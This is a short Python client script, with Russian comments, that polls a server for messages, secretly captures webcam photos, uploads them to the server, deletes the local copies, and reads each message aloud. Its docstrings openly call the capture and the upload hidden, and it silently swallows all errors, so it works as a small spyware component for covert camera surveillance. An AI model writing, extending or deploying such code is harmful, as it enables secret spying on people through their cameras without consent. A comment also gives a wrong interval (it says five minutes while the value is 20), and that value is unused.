# client.py
import requests
import cv2
import os
import time
from datetime import datetime
import pyttsx3

SERVER_URL = "http://127.0.0.1:8000"
UPLOAD_INTERVAL = 20  # 5 минут

def speak(text):
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

def capture_camera():
    """Скрытый захват фото с камеры"""
    cap = cv2.VideoCapture(0)

    # Пробуем сделать 5 снимков для надежности
    for _ in range(5):
        ret, frame = cap.read()
        if ret:
            filename = f"camera_{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
            cv2.imwrite(filename, frame)
            cap.release()
            return filename
    return None


def upload_file(filename):
    """Скрытая отправка файла"""
    try:
        with open(filename, "rb") as f:
            requests.post(
                f"{SERVER_URL}/upload_photo",
                files={"file": f},
                timeout=10
            )
        os.remove(filename)
    except:
        pass


while True:
    try:
        # Проверяем сообщения
        response = requests.get(f"{SERVER_URL}/get_message")
        if response.json().get("message"):
            photo = capture_camera()
            if photo:
                upload_file(photo)
            mess = response.json()["message"]
            speak(mess)
        time.sleep(15)

    except KeyboardInterrupt:
        break
    except:
        time.sleep(10)